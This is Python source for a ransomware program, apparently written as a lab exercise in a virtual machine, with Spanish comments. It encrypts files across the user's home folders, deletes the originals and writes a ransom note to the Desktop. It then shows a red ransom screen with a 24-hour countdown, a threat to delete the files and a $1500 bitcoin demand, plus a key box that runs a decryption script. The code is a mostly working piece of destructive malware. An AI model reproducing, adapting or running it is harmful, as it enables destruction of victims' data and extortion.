from cryptography.fernet import Fernet
import os
import sys
import tkinter as tk
import customtkinter as ctk
import subprocess
from PIL import Image, ImageTk

# Determina el directorio base de la aplicación dependiendo del modo de ejecución
if getattr(sys, "frozen", False):
    BASE_DIR = sys._MEIPASS
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

KEY_FILE = os.path.join(BASE_DIR, "key.key")

# Enlistados los folders que va a recorrer el programa para controlar el scope del ransomware
home = os.path.expanduser("~")

folders = [
    "Desktop",
    "Documents",
    "Downloads",
    "Music",
    "Pictures",
    "Public",
    "Templates",
    "Videos"
]

TARGET_FOLDER = os.path.expanduser("~")
# TARGET_FOLDER = "/home/vboxuser/Documents/archivos_importantes"
# TARGET_FOLDER = "/home/vboxuser/Documents"

# Ruta excluida
EXCLUDE_ROUTE = "/home/vboxuser/Documents/ransom"
EXCLUDE_ROUTE_2 = "/home/vboxuser/snap"

def load_key():
    # Carga la clave desde key.key
    with open(KEY_FILE, "rb") as file:
        return file.read()


def encrypt_file(file_path, cipher):
    # Cifra un archivo individual

    size = os.path.getsize(file_path)

    if size > 100 * 1024 * 1024:
        print(f"archivo muy grande, saltando: {file_path}")
        return

    # Leer contenido original
    with open(file_path, "rb") as file:
        data = file.read()

    # Cifrar contenido
    encrypted_data = cipher.encrypt(data)

    # Guardar archivo cifrado
    encrypted_path = file_path + ".encrypted"

    with open(encrypted_path, "wb") as file:
        file.write(encrypted_data)

    # Eliminar el original
    os.remove(file_path)

    print(f"Cifrado: {file_path}")


def encrypt_folder(folders, cipher):
    # Recorre la carpeta y cifra los archivos

    for folder in folders:

        folder_path = os.path.join(home, folder)

        if not os.path.exists(folder_path):
            print(f"No existe la carpeta: {folder_path}")
            continue

        print(f"Recorriendo: {folder_path}")

        for root, directories, files in os.walk(folder_path):

            if os.path.abspath(root).startswith(EXCLUDE_ROUTE):
                continue

            if os.path.abspath(root).startswith(EXCLUDE_ROUTE_2):
                continue    

        for file in files:

            file_path = os.path.join(root, file)

            if not os.path.isfile(file_path):
                continue

            # If para evitar cifrar archivos ya cifrados
            if file.endswith(".encrypted"):
                continue

            # Manejo de excepciones
            try:

                encrypt_file(file_path, cipher)
            except PermissionError:
                print(f"Sin permisos: {file_path}")
            except OSError as e:
                print(f"No se pudo abrir {file_path}: {e}")
            except Exception as e:
                print(f"Error con {file_path}: {e}")

# Funcion para cerificar que la llave colocada en el input de la interfaz visual sea valida
def verificar_llave():

    llave_ingresada = entrada_llave.get()

    try:
        with open("key.key", "r") as archivo:
            llave_guardada = archivo.read().strip()
        
        if llave_ingresada == llave_guardada:
            mensaje.configure(
                text="Llave valida",
                text_color="green"
            )

            # Si es valida la clave, manda a ejecutar el script para la desencriptación
            subprocess.Popen(
                ["python3", "decrypt.py"]
            )

        else:
            mensaje.configure(
                text="Llave incorrecta",
                text_color="red"
            )

    except FileNotFoundError:
        mensaje.configure(
            text="No se encontro la key"
        )

if __name__ == "__main__":

    # Verificar existencia de la clave
    if not os.path.exists(KEY_FILE):
        print("No existe key.key. Primero genera la clave.")
        exit()

    # Verificar carpeta
    if not os.path.exists(TARGET_FOLDER):
        print("La carpeta indicada no existe.")
        exit()


    key = load_key()

    cipher = Fernet(key)

    encrypt_folder(folders, cipher)

    print("\nProceso terminado.")

# Obtener la ruta del escritorio
desktop = os.path.join(os.path.expanduser("~"), "Desktop")

# Nombre y ruta del archivo
file_path = os.path.join(desktop, "README_RANS.txt")

# Crear el archivo y escribir contenido
with open(file_path, "w", encoding="utf-8") as file:
    file.write("TU CARPETA HA SIDO ENCRIPTADA.\n")
    file.write("SIGUE LAS INSTRUCCIONES PARA RECUPERAR TUS ARCHIVOS.\n")

print(f"Archivo creado correctamente en: {file_path}")


# Interfaz grafica

# Configuración de apariencia
ctk.set_appearance_mode("dark")

# Ventana principal
app = ctk.CTk()

app.geometry("800x500")
app.title("Mi aplicación")

# Fondo rojo
app.configure(fg_color="#b30000")



# Barra superior negra

barra_superior = ctk.CTkFrame(
    app,
    height=100,
    fg_color="black",
    corner_radius=0
)

barra_superior.pack(
    fill="x",
    side="top"
)


# Imagen
imagen = Image.open("images.png")
imagen = imagen.resize((70,70))

imagen_tk = ImageTk.PhotoImage(imagen)

label_imagen = ctk.CTkLabel(
    barra_superior,
    image=imagen_tk,
    text=""
)

label_imagen.pack(
    side="left",
    padx=20,
    pady=15
)


# Texto al lado de la imagen

texto = ctk.CTkLabel(
    barra_superior,
    text="OOOPS, TUS ARCHIVOS HAN SIDO ENCRIPTADOS",
    font=("Arial", 28),
    text_color="white"
)

texto.pack(
    side="left",
    padx=10
)

# Texto central

texto_centro = ctk.CTkLabel(
    app,
    text="TUS ARCHIVOS SERAN ELIMINADOS",
    font=("Arial", 30),
    text_color="white"
)

texto_centro.pack(
    expand=True,
    pady=20
)



# Contador de 24 horas

segundos_restantes = 24 * 60 * 60

contador_label = ctk.CTkLabel(
    app,
    text="24:00:00",
    font=("Arial", 50),
    text_color="white"
)

contador_label.pack(
    pady=20
)


def actualizar_contador():

    global segundos_restantes

    horas = segundos_restantes // 3600
    minutos = (segundos_restantes % 3600) // 60
    segundos = segundos_restantes % 60

    tiempo = f"{horas:02}:{minutos:02}:{segundos:02}"

    contador_label.configure(
        text=tiempo
    )

    if segundos_restantes > 0:
        segundos_restantes -= 1
        app.after(1000, actualizar_contador)


actualizar_contador()


# Parte inferior

pie = ctk.CTkLabel(
    app,
    text="PAGA AQUI 1500$ EQUIVALENTES A BITCOIN XXXXXXXXX",
    font=("Arial", 20),
    text_color="white"
)

pie.pack(
    side="bottom",
    pady=20
)

entrada_llave = ctk.CTkEntry(
    app,
    placeholder_text="Ingrese la llave",
    width=300
)

entrada_llave.pack(
    pady=10
)

# Boton Validar

boton_acceso = ctk.CTkButton(
    app,
    text="Ingresar",
    command=verificar_llave
)

boton_acceso.pack(
    pady=10
)

# Mensaje de estado

mensaje = ctk.CTkLabel(
    app,
    text=""
)

mensaje.pack(
    pady=10
)

# Ejecutar
app.mainloop()
